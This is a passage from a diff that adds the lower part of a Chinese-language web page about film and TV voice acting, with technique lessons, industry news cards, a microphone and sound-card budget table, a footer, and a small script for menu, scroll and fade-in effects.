+          <p>影视配音的核心是对位，掌握拆句、抢气、留白三种节奏处理方法，让声音与原片表演严丝合缝。</p>
+        </div>
+        <div class="sk-tag"><em>核心技法</em><em>对位</em></div>
+        <a href="#" aria-label="台词对口型" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#ffb020,#ff2e97);">
+        <div class="sk-no">04</div>
+        <div class="sk-info">
+          <h4>情绪爆发：哭戏与怒戏的声音处理</h4>
+          <p>高强度情绪台词不是靠喊，靠气息推动与声带松紧配合，学会真假声转换让爆发力更真实。</p>
+        </div>
+        <div class="sk-tag"><em>高阶</em><em>情绪</em></div>
+        <a href="#" aria-label="情绪爆发" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#8b5cf6,#ec4899);">
+        <div class="sk-no">05</div>
+        <div class="sk-info">
+          <h4>配音设备与录音棚环境入门</h4>
+          <p>麦克风、声卡、防喷罩怎么选，家庭录音角如何布置吸音，低成本搭建专业感录音环境。</p>
+        </div>
+        <div class="sk-tag"><em>设备</em><em>录音</em></div>
+        <a href="#" aria-label="配音设备" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+      <div class="skill-row fade-up" style="--g:linear-gradient(135deg,#06d6f0,#a3e635);">
+        <div class="sk-no">06</div>
+        <div class="sk-info">
+          <h4>影视配音入行：试音与接单避坑指南</h4>
+          <p>配音圈行业现状、试音样音怎么录、报价如何谈，新人入行的实用建议与常见套路提醒。</p>
+        </div>
+        <div class="sk-tag"><em>行业</em><em>入行</em></div>
+        <a href="#" aria-label="配音入行" style="position:absolute;inset:0;z-index:5;"></a>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目四：行业资讯（卡片+图） ==================== -->
+<section class="s-news" id="news">
+  <div class="wrap">
+    <div class="head fade-up">
+      <span class="kick">Industry News</span>
+      <h2>影视配音行业资讯</h2>
+      <p>关注配音圈动态、行业活动与新作配音花絮，了解影视配音行业最新风向。</p>
+    </div>
+
+    <div class="news-grid">
+
+      <article class="news-main fade-up" style="--g:linear-gradient(135deg,#ff2e97,#8b5cf6);">
+        <div class="nm-body">
+          <span>深度报道</span>
+          <h3>国产动画配音生态调查：从"幕后"走向"台前"的声优经济</h3>
+          <p>随着国漫崛起与广播剧爆发，配音演员逐渐获得大众认知，影视配音 深度解析这一细分文化产业的商业逻辑与人才流动。</p>
+        </div>
+        <a href="#" aria-label="国产动画配音生态" style="position:absolute;inset:0;z-index:5;"></a>
+      </article>
+
+      <div class="news-side">
+        <article class="news-mini fade-up" style="--g:linear-gradient(135deg,#06d6f0,#3b82f6);">
+          <div class="nm-thumb">🎙️</div>
+          <div class="nm-text">
+            <h5>译制片配音三十年：经典声音的记忆与传承</h5>
+            <span>行业 · 12 分钟阅读</span>
+          </div>
+          <a href="#" aria-label="译制片配音" style="position:absolute;inset:0;z-index:5;"></a>
+        </article>
+
+        <article class="news-mini fade-up" style="--g:linear-gradient(135deg,#a3e635,#06d6f0);">
+          <div class="nm-thumb">🎤</div>
+          <div class="nm-text">
+            <h5>配音演员跨界出圈：从幕后到综艺舞台</h5>
+            <span>动态 · 8 分钟阅读</span>
+          </div>
+          <a href="#" aria-label="配音演员跨界" style="position:absolute;inset:0;z-index:5;"></a>
+        </article>
+
+        <article class="news-mini fade-up" style="--g:linear-gradient(135deg,#ffb020,#ff2e97);">
+          <div class="nm-thumb">📻</div>
+          <div class="nm-text">
+            <h5>广播剧市场增长：有声内容的下一个风口</h5>
+            <span>市场 · 10 分钟阅读</span>
+          </div>
+          <a href="#" aria-label="广播剧市场" style="position:absolute;inset:0;z-index:5;"></a>
+        </article>
+
+        <article class="news-mini fade-up" style="--g:linear-gradient(135deg,#8b5cf6,#ec4899);">
+          <div class="nm-thumb">🎬</div>
+          <div class="nm-text">
+            <h5>影视剧配音行业薪资与报价参考</h5>
+            <span>干货 · 6 分钟阅读</span>
+          </div>
+          <a href="#" aria-label="配音薪资" style="position:absolute;inset:0;z-index:5;"></a>
+        </article>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 栏目五：设备推荐（规格对比） ==================== -->
+<section class="s-gear" id="gear">
+  <div class="wrap">
+    <div class="head fade-up">
+      <span class="kick">Gear Guide</span>
+      <h2>影视配音录音设备推荐</h2>
+      <p>影视配音 整理不同预算下的麦克风、声卡与配件组合，新手也能搭建高性价比录音环境。</p>
+    </div>
+
+    <div class="gear-wrap fade-up">
+      <table class="gear-table">
+        <thead>
+          <tr>
+            <th>设备档位</th>
+            <th>麦克风</th>
+            <th>声卡 / 接口</th>
+            <th>参考预算</th>
+            <th>适合人群</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>入门体验</td>
+            <td class="hl">USB 电容麦</td>
+            <td>免声卡直插</td>
+            <td>300 - 800 元</td>
+            <td>新手试水、有声书录制</td>
+          </tr>
+          <tr>
+            <td>进阶练习</td>
+            <td>大振膜电容麦</td>
+            <td>入门 USB 声卡</td>
+            <td>800 - 2500 元</td>
+            <td>广播剧、角色配音</td>
+          </tr>
+          <tr>
+            <td>准专业</td>
+            <td>高端电容麦</td>
+            <td>专业声卡 + 耳放</td>
+            <td>2500 - 6000 元</td>
+            <td>影视配音接单、棚录</td>
+          </tr>
+          <tr>
+            <td>专业棚级</td>
+            <td>真空管 / 铝带麦</td>
+            <td>多通道音频接口</td>
+            <td>6000 元以上</td>
+            <td>影视剧主配、配音工作室</td>
+          </tr>
+          <tr>
+            <td>配件必选</td>
+            <td colspan="2">防喷罩 · 悬臂支架 · 监听耳机 · 吸音棉</td>
+            <td>300 - 1200 元</td>
+            <td>改善录音质感</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer>
+  <div class="foot-in">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a href="#top" class="logo">
+          <span class="logo-orb">🎙️</span>
+          <b>影视配音</b>
+        </a>
+        <p>影视配音 是聚焦影视配音艺术与行业的专题平台，收录配音演员档案、影视配音作品、动画与译制片配音片段，以及配音技巧教程与行业资讯，服务配音爱好者与从业者。</p>
+        <span class="foot-site">🌐 官方网站：yingshipeiyin.cn</span>
+      </div>
+      <div class="foot-col">
+        <h4>作品库</h4>
+        <ul>
+          <li><a href="#cat">影视剧配音</a></li>
+          <li><a href="#cat">动画配音</a></li>
+          <li><a href="#cat">译制片配音</a></li>
+          <li><a href="#cat">广播剧配音</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>配音演员</h4>
+        <ul>
+          <li><a href="#cv">国内配音演员</a></li>
+          <li><a href="#cv">声优档案</a></li>
+          <li><a href="#cv">配音导演</a></li>
+          <li><a href="#cv">新人推荐</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>学习交流</h4>
+        <ul>
+          <li><a href="#skill">配音技巧</a></li>
+          <li><a href="#gear">设备指南</a></li>
+          <li><a href="#">配音课程</a></li>
+          <li><a href="#">试音素材</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">关于平台</a></li>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">联系方式</a></li>
+          <li><a href="#">友情链接</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <p>© 2026 影视配音 · yingshipeiyin.cn 保留所有权利 | 本站为影视配音文化与资讯平台，作品版权归原作者及制作方所有</p>
+      <div class="foot-legal">
+        <a href="#">隐私政策</a>
+        <a href="#">使用条款</a>
+        <a href="#">免责声明</a>
+        <a href="#">网站地图</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<button class="gotop" id="gotop" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  'use strict';
+  var burger=document.getElementById('burger'),menu=document.getElementById('menu');
+  burger.addEventListener('click',function(){menu.classList.toggle('open');});
+  menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('open');});});
+
+  var topbar=document.querySelector('.top'),gotop=document.getElementById('gotop');
+  window.addEventListener('scroll',function(){
+    topbar.style.boxShadow=window.scrollY>40?'0 4px 30px rgba(0,0,0,.5)':'none';
+    gotop.classList.toggle('show',window.scrollY>600);
+  });
+  gotop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}});
+  },{threshold:0.12,rootMargin:'0px 0px -40px 0px'});
+  document.querySelectorAll('.fade-up').forEach(function(el){io.observe(el);});
+})();
+</script>
+
+</body>
+</html>
